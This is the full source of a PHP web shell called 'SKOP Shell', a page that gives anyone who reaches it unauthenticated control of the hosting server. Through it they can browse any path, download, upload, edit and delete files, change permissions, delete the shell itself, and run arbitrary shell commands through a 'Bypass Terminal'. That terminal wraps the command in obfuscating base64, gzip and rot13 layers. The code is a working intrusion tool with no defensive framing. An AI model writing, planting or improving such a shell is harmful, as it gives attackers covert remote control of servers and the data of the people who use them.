<?php
// Set the initial path to the current working directory or a provided path
$currentPath = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();

// Function to list directory contents (files and directories)
function getDirectoryContents($path) {
    $contents = [];

    if (is_dir($path) && $handle = opendir($path)) {
        while (false !== ($entry = readdir($handle))) {
            if ($entry != '.' && $entry != '..') {
                $fullPath = $path . DIRECTORY_SEPARATOR . $entry;
                $permissions = substr(sprintf('%o', fileperms($fullPath)), -4);
                $contents[] = [
                    'name' => $entry,
                    'permissions' => $permissions,
                    'path' => $fullPath,
                    'isFile' => is_file($fullPath)
                ];
            }
        }
        closedir($handle);
    }

    return $contents;
}

// Handle file download request
if (isset($_GET['download'])) {
    $downloadPath = $_GET['download'];
    if (is_file($downloadPath) && file_exists($downloadPath)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($downloadPath) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($downloadPath));
        readfile($downloadPath);
        exit;
    }
}

// Handle file deletion
if (isset($_POST['delete'])) {
    $deletePath = $_POST['delete'];
    if (is_file($deletePath)) {
        unlink($deletePath);
    } elseif (is_dir($deletePath)) {
        rmdir($deletePath);
    }
    header("Location: ?path=" . urlencode($currentPath));
    exit;
}

// Handle file renaming
if (isset($_POST['rename'])) {
    $oldName = $_POST['old_name'];
    $newName = $_POST['new_name'];
    $oldPath = $_POST['old_path'];
    
    // Construct new path for renaming
    $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . $newName;

    // Rename the file or directory
    if (file_exists($oldPath)) {
        rename($oldPath, $newPath);
    }
    header("Location: ?path=" . urlencode($currentPath));
    exit;
}

// Handle self-destruction
if (isset($_POST['self_delete'])) {
    // Self-delete logic: delete this script file
    $scriptPath = __FILE__;
    if (is_file($scriptPath)) {
        unlink($scriptPath);
        exit; // Exit to stop further execution after deletion
    }
}
// Handle file editing and saving
if (isset($_POST['save'])) {
    $filePath = $_POST['file_path'];
    $fileContent = $_POST['file_content'];
    file_put_contents($filePath, $fileContent);
    header("Location: ?path=" . urlencode($currentPath));
    exit;
}

// Handle file uploads
if (isset($_FILES['file_upload'])) {
    $uploadFilePath = $currentPath . DIRECTORY_SEPARATOR . basename($_FILES['file_upload']['name']);
    move_uploaded_file($_FILES['file_upload']['tmp_name'], $uploadFilePath);
    header("Location: ?path=" . urlencode($currentPath));
    exit;
}

// Handle changing permissions
if (isset($_POST['change_permissions'])) {
    $permPath = $_POST['file_path'];
    $newPermissions = $_POST['permissions'];
    chmod($permPath, octdec($newPermissions));
    header("Location: ?path=" . urlencode($currentPath));
    exit;
}

// Handle command execution for bypass terminal
$commandOutput = '';
if (isset($_POST['bypass_command'])) {
    // Get the encoded command
    $skop = $_POST['bypass_command'];
    $bc= "base64_decode";
    $encodedCommand = base64_encode(gzcompress(str_rot13(gzdeflate(base64_encode($skop)))));

    // Decode the command
    $command = base64_decode(gzinflate(str_rot13(gzuncompress(base64_decode($encodedCommand)))));
    
    // Execute the command
    $en = base64_encode(gzcompress(base64_encode("cd $currentPath && $command 2>&1")));
    $commandOutput = shell_exec(base64_decode(gzuncompress(base64_decode($en))));
}
// Handle search functionality
$searchResults = [];
if (isset($_POST['search'])) {
    $searchTerm = $_POST['search_term'];
    $contents = getDirectoryContents($currentPath);
    foreach ($contents as $item) {
        if (stripos($item['name'], $searchTerm) !== false) {
            $searchResults[] = $item;
        }
    }
}


// Breadcrumb navigation for current path
$breadcrumbs = explode(DIRECTORY_SEPARATOR, $currentPath);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SKOP IS HERE</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
    body {
        background-color: #f4f4f9;
    }
    .breadcrumb {
        background-color: #ffffff;
    }
    .container {
        margin-top: 20px;
    }
    pre {
        background-color: #f9f9f9;
        padding: 10px;
        border: 1px solid #ddd;
    }
    .file-actions {
        display: inline-flex;
        float: right; /* Align file actions to the right */
    }
</style>

</head>
<body>
    <div class="container">
        <h1 class="text-center">SKOP Shell</h1>

        

        <!-- Breadcrumb for directory navigation -->
        <nav aria-label="breadcrumb">
            <ol class="breadcrumb">
                <?php $path = ''; ?>
                <?php foreach ($breadcrumbs as $crumb): ?>
                    <?php if (!empty($crumb)): ?>
                        <?php $path .= DIRECTORY_SEPARATOR . $crumb; ?>
                        <li class="breadcrumb-item"><a href="?path=<?= urlencode($path) ?>"><?= htmlspecialchars($crumb) ?></a></li>
                    <?php endif; ?>
                <?php endforeach; ?>
            </ol>
        </nav>

        <!-- Display current directory contents -->
         <!-- Buttons for current directory and self-destruct -->
        <div class="d-flex justify-content-between mb-3">
            <form method="get" class="mb-0">
                <button type="submit" class="btn btn-info">Current Directory</button>
            </form>
             <!-- Self-delete button -->
        <form method="post" class="self-delete-btn">
            <button type="submit" name="self_delete" class="btn btn-danger btn-sm">Self-Destory</button>
        </form>
        </div>
        <!-- Upload file -->
        <div class="mt-4">
            <h5>Upload File</h5>
            <form method="post" enctype="multipart/form-data">
                <input type="file" name="file_upload" class="form-control-file">
                <button type="submit" class="btn btn-primary mt-2">Upload</button>
            </form>
        </div>

        <!-- Edit file content -->
        <?php if (isset($_GET['view'])): ?>
            <div class="mt-4">
                <h5>Editing: <?= htmlspecialchars($_GET['view']) ?></h5>
                <form method="post">
                    <input type="hidden" name="file_path" value="<?= htmlspecialchars($_GET['view']) ?>">
                    <textarea name="file_content" class="form-control" rows="10"><?= htmlspecialchars(file_get_contents($_GET['view'])) ?></textarea>
                    <button type="submit" name="save" class="btn btn-success mt-2">Save</button>
                </form>
            </div>
        <?php endif; ?>

       <!-- Execute bypass commands -->
<div class="mt-4">
    <h5>Bypass Terminal</h5>
    <form method="post">
        <input type="text" name="bypass_command" class="form-control" placeholder="Enter encoded command">
        <button type="submit" class="btn btn-primary mt-2">Run Command</button>
    </form>
    <pre><?= htmlspecialchars($commandOutput) ?></pre>
</div>
<!-- Search functionality -->
<div class="mt-4">
            <h5>Search Files</h5>
            <form method="post">
                <input type="text" name="search_term" class="form-control" placeholder="Enter search term" required>
                <button type="submit" name="search" class="btn btn-success mt-2">Search</button>
            </form>
            <h6>Search Results:</h6>
            <ul class="list-group mt-2">
                <?php if (!empty($searchResults)): ?>
                    <?php foreach ($searchResults as $item): ?>
                        <li class="list-group-item">
                            <div>
                                <?php if ($item['isFile']): ?>
                                    <a href="?view=<?= urlencode($item['path']) ?>"><?= htmlspecialchars($item['name']) ?></a>
                                    <form method="post" class="file-actions" style="display:inline;">
                                        <input type="hidden" name="delete" value="<?= htmlspecialchars($item['path']) ?>">
                                        <button type="submit" class="btn btn-danger btn-sm">Delete</button>
                                    </form>
                                    <form method="post" class="file-actions" style="display:inline;">
                                        <input type="hidden" name="old_name" value="<?= htmlspecialchars($item['name']) ?>">
                                        <input type="hidden" name="old_path" value="<?= htmlspecialchars($item['path']) ?>">
                                        <input type="text" name="new_name" class="form-control-file" placeholder="New Name" required>
                                        <button type="submit" name="rename" class="btn btn-warning btn-sm">Rename</button>
                                    </form>
                                <?php else: ?>
                                    <strong><?= htmlspecialchars($item['name']) ?></strong>
                                <?php endif; ?>
                            </div>
                        </li>
                    <?php endforeach; ?>
                <?php else: ?>
                    <li class="list-group-item">No results found.</li>
                <?php endif; ?>
            </ul>
        </div>

    <ul class="list-group">
    <?php foreach (getDirectoryContents($currentPath) as $item): ?>
        <li class="list-group-item">
            <div>
                <?php if ($item['isFile']): ?>
                    <i class="fas fa-file"></i>
                    <a href="?path=<?= urlencode($currentPath) ?>&view=<?= urlencode($item['path']) ?>"><?= htmlspecialchars($item['name']) ?></a>
                <?php else: ?>
                    <i class="fas fa-folder"></i>
                    <a href="?path=<?= urlencode($item['path']) ?>"><?= htmlspecialchars($item['name']) ?></a>
                <?php endif; ?>
            </div>
            <div class="file-actions">
                <?php if ($item['isFile']): ?>
                    <a href="?download=<?= urlencode($item['path']) ?>" class="btn btn-outline-info btn-sm ml-2" title="Download">
                        <i class="fas fa-download"></i>
                    </a>
                <?php endif; ?>
                <form method="post" style="display:inline;">
                    <input type="hidden" name="delete" value="<?= htmlspecialchars($item['path']) ?>">
                    <button type="submit" class="btn btn-outline-danger btn-sm ml-2" title="Delete">
                        <i class="fas fa-trash"></i>
                    </button>
                </form>
                <!-- Add a form for renaming files -->
                <form method="post" class="ml-2" style="display:inline;">
                            <input type="hidden" name="old_name" value="<?= htmlspecialchars($item['name']) ?>">
                            <input type="hidden" name="old_path" value="<?= htmlspecialchars($item['path']) ?>">
                            <input type="text" name="new_name" class="form-control-sm" placeholder="New Name" required>
                            <button type="submit" name="rename" class="btn btn-outline-warning btn-sm">R</button>
                        </form>
                <form method="post" class="ml-2" style="display:inline;">
                    <input type="hidden" name="file_path" value="<?= htmlspecialchars($item['path']) ?>">
                    <input type="text" name="permissions" class="form-control-sm" value="<?= htmlspecialchars($item['permissions']) ?>" style="width:60px;">
                    <button type="submit" name="change_permissions" class="btn btn-outline-secondary btn-sm">P</button>
                </form>
            </div>
        </li>
    <?php endforeach; ?>
</ul>

        

    
</body>
</html>